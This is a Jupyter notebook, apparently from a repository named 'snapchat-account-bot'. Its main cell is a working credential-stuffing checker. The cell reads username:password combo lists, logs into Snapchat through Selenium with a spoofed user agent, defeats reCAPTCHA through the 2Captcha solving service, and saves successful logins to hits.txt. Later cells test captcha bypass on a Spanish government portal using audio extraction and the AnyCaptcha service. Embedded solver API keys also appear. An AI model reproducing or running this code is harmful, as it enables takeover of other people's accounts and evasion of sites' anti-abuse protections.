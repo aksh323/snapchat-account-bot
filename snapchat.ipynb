{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "a6905945",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\akash\\AppData\\Local\\Temp/ipykernel_10036/1642340996.py:44: DeprecationWarning: executable_path has been deprecated, please pass in a Service object\n",
      "  driver = webdriver.Chrome(executable_path=ex,options=options)\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[1;32m~\\AppData\\Local\\Temp/ipykernel_10036/1642340996.py\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m     60\u001b[0m         \u001b[0mresp\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mrequests\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mget\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mfetch_url\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     61\u001b[0m         \u001b[1;32mwhile\u001b[0m \u001b[1;34m'CHA_NOT_READY'\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mresp\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m3\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 62\u001b[1;33m             \u001b[0mtime\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msleep\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;36m5\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     63\u001b[0m             \u001b[0mresp\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mrequests\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mget\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mfetch_url\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     64\u001b[0m         \u001b[1;32mif\u001b[0m \u001b[0mresp\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;36m2\u001b[0m\u001b[1;33m]\u001b[0m \u001b[1;33m==\u001b[0m \u001b[1;34m'OK'\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import sys\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.webdriver.support.ui import WebDriverWait \n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from twocaptcha import TwoCaptcha\n",
    "from twocaptcha.api import ApiException, NetworkException\n",
    "from twocaptcha.solver import ValidationException\n",
    "import time\n",
    "from selenium.webdriver import ActionChains\n",
    "'''import configparser\n",
    "\n",
    "Config = configparser.ConfigParser()\n",
    "Config.read(\"config.ini\")\n",
    "license = Config.get('SETTINGS', 'license')\n",
    "#license = input(\"What is your license key? \")\n",
    "validKey = str(\"12345\")\n",
    "if validKey in license:\n",
    "    print(\"Welcome to Snapchat Checker!\")\n",
    "else:\n",
    "    sys.exit(\"License key invalid\")'''\n",
    "\n",
    "###Initialize 2Captcha\n",
    "captchaAPI = '7b7be518122e50239f38445a3a3322c9'\n",
    "google_site_key = '6LeunykcAAAAACP-WEAPOD9UCKiT6lgp7172wwpl' \n",
    "pageurl = 'https://accounts.snapchat.com/accounts/login' \n",
    "url = \"http://2captcha.com/in.php?key=\" + captchaAPI + \"&method=userrecaptcha&googlekey=\" + google_site_key + \"&pageurl=\" + pageurl\n",
    "###END OF INITIALIZATION\n",
    "combolist = open(\"combos.txt\", \"r\").readlines()\n",
    "\n",
    "for combo in combolist:\n",
    "    seq = combo.strip()\n",
    "    acc = seq.split(\":\")\n",
    "\n",
    "    username = acc[0]\n",
    "    password = acc[1]\n",
    "    account = username + \":\" + password\n",
    "    \n",
    "    ex = r'C:\\Users\\akash\\Desktop\\chromedriver.exe'\n",
    "    options = webdriver.ChromeOptions()\n",
    "    options.add_argument('--user-agent=\"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36\"')\n",
    "    driver = webdriver.Chrome(executable_path=ex,options=options)\n",
    "    driver.implicitly_wait(5)\n",
    "    driver.get(\"https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fsso%3Freferrer%3Dhttps%253A%252F%252Fkit.snapchat.com%252Fmanage%252F%26client_id%3Dconnect-portal-v2--prod\")\n",
    "    driver.find_element(By.ID, 'username').send_keys(username)\n",
    "    driver.find_element(By.ID, 'password').send_keys(password)\n",
    "    ### 2CAPTCHA API NEEDED HERE###\n",
    "    #driver.execute_script(\"\"\"document.getElementById(\"g-recaptcha-response\").innerHTML = arguments[0]\"\"\", resp.text[3:])\n",
    "    #driver.execute_script(\"\"\"onSubmit(arguments[0])\"\"\", resp.text[3:])\n",
    "    driver.execute_script('var element=document.getElementById(\"g-recaptcha-response\"); element.style.display=\"block\";')\n",
    "    resp = requests.get(url)\n",
    "    if resp.text[0:2] != 'OK': \n",
    "        quit('Service error. Error code:' + resp.text) \n",
    "    captcha_id = resp.text[3:]\n",
    "    fetch_url = \"http://2captcha.com/res.php?key=\"+ captchaAPI + \"&action=get&id=\" + captcha_id\n",
    "    for i in range(1, 10):  \n",
    "        time.sleep(5) # wait 5 sec.\n",
    "        resp = requests.get(fetch_url)\n",
    "        while 'CHA_NOT_READY' in resp.text[3:]:\n",
    "            time.sleep(5)\n",
    "            resp = requests.get(fetch_url)\n",
    "        if resp.text[0:2] == 'OK':\n",
    "            break \n",
    "    ###driver.execute_script('var element=document.getElementById(\"g-recaptcha-response\"); element.style.display=\"block\";')\n",
    "    print(\"DEBUG: \" + resp.text[3:])\n",
    "    driver.execute_script(\"\"\"\n",
    "    document.getElementById(\"g-recaptcha-response\").innerHTML = arguments[0]\n",
    "    \"\"\", resp.text[3:])\n",
    "    #driver.execute_script('document.getElementById(\"g-recaptcha-response\").innerHTML = arguments[0]', resp.text[3:])\n",
    "    ###driver.find_element(By.ID, 'g-recaptcha-response').submit()\n",
    "    #driver.find_element_by_id(\"g-recaptcha-response\").submit()\n",
    "    ###END 2CAPTCHA\n",
    "    ###AFTER CAPTCHA COMPLETE###\n",
    "    time.sleep(1)\n",
    "    driver.switch_to.parent_frame()\n",
    "    driver.find_element_by_xpath('//*[@id=\"login_form\"]/div[4]/button').click()\n",
    "    WebDriverWait(driver=driver, timeout=10).until(\n",
    "        lambda x: x.execute_script(\"return document.readyState === 'complete'\")\n",
    "    )\n",
    "    error_message = (\"That's not the right password.\")\n",
    "    if error_message in driver.page_source:\n",
    "        print(\"fail: \" + username + \":\" + password + \" is a failed combo\")\n",
    "    else:\n",
    "        print(\"SUCCESS: \" + username + \":\" + password + \" is a WORKING combo\")\n",
    "        hits = open(\"hits.txt\", 'w')\n",
    "        hits.write(username + \":\" + password + \"\\n\")\n",
    "    driver.delete_all_cookies()\n",
    "    driver.close()\n",
    "print(\"Checking finished.\")\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "8c9f0607",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import sys\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.webdriver.support.ui import WebDriverWait \n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.webdriver import ActionChains"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "c4d0474d",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\akash\\AppData\\Local\\Temp/ipykernel_7080/3812371676.py:4: DeprecationWarning: executable_path has been deprecated, please pass in a Service object\n",
      "  driver = webdriver.Chrome(executable_path=ex,options=options)\n"
     ]
    }
   ],
   "source": [
    "ex = r'C:\\Users\\akash\\Desktop\\chromedriver.exe'\n",
    "options = webdriver.ChromeOptions()\n",
    "options.add_argument('--user-agent=\"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36\"')\n",
    "driver = webdriver.Chrome(executable_path=ex,options=options)\n",
    "driver.implicitly_wait(5)\n",
    "driver.get('https://sede.administracionespublicas.gob.es/renova2012/entradaRenovacion')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "cf11baca",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\akash\\AppData\\Local\\Temp/ipykernel_7088/1095056488.py:1: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead\n",
      "  sound_pic_click = driver.find_element_by_xpath('//*[@id=\"escucharCaptcha\"]/img').click()\n",
      "C:\\Users\\akash\\AppData\\Local\\Temp/ipykernel_7088/1095056488.py:2: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead\n",
      "  sound = driver.find_element_by_id('audioReproductor')\n"
     ]
    }
   ],
   "source": [
    "sound_pic_click = driver.find_element_by_xpath('//*[@id=\"escucharCaptcha\"]/img').click()\n",
    "sound = driver.find_element_by_id('audioReproductor')\n",
    "sound_in_base64 = sound.get_attribute('src')\n",
    "sound_code = sound_in_base64.split(',')[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e68aae31",
   "metadata": {},
   "outputs": [],
   "source": [
    "sound_code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "82025f08",
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "decode_bytes = base64.b64decode(sound_code)\n",
    "with open('code2' + '.mp3', \"wb\") as wav_file:\n",
    "    wav_file.write(decode_bytes)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e04f457",
   "metadata": {},
   "outputs": [],
   "source": [
    "zzz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "e435035c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import subprocess\n",
    "  \n",
    "# convert mp3 to wav file\n",
    "subprocess.call(['ffmpeg', '-i', 'C:\\\\Users\\\\akash\\\\Downloads\\\\bengal.m4a',\n",
    "                 'bengal.wav'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "89b82daa",
   "metadata": {},
   "outputs": [],
   "source": [
    "!bengal.wav"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "44a43374",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\akash\\AppData\\Local\\Temp/ipykernel_7088/3938521265.py:1: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead\n",
      "  image_byte =driver.find_element_by_class_name('img-thumbnail').screenshot_as_png\n"
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "04b6de5b",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\akash\\AppData\\Local\\Temp/ipykernel_7080/3302933497.py:4: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead\n",
      "  image_byte =driver.find_element_by_class_name('img-thumbnail').screenshot_as_png\n"
     ]
    }
   ],
   "source": [
    "def save_capthca():\n",
    "    import PIL.Image as image\n",
    "    import io\n",
    "\n",
    "    image_byte =driver.find_element_by_class_name('img-thumbnail').screenshot_as_png\n",
    "    img  = image.open(io.BytesIO(image_byte))\n",
    "    img.save('captcha.png',format='png')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "5d6c0b0f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from anycaptcha import *\n",
    "def imagetotext(img):\n",
    "    api_key = '39aa7ee2c3b84299b0cd497066b092a3'\n",
    "    captcha_fp = open(img, 'rb')\n",
    "    client = AnycaptchaClient(api_key)\n",
    "    task = ImageToTextTask(captcha_fp)\n",
    "    job = client.createTask(task,typecaptcha=\"text\")\n",
    "    job.join()\n",
    "    result = job.get_solution_response()\n",
    "    if result.find(\"ERROR\") != -1:\n",
    "        print(\"error \", result)\n",
    "    else:\n",
    "        print(\"success \", result)\n",
    "    return result\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "b24c80d5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "success  g6che\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'g6che'"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "imagetotext('captcha.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "id": "8f09e02f",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "802a89ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8d5539d8",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1b4c459",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1675b273",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eab8ad6b",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c63f721",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "1c0d60c9",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "8250fd3b",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2fb9650a",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e0eaac1c",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "719630e8",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5420e01b",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "847bfa2d",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "1fd35f9c",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a774d916",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b34a09a3",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "dd801965",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "dd1c3a09",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "41b6a46a",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "477a500e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
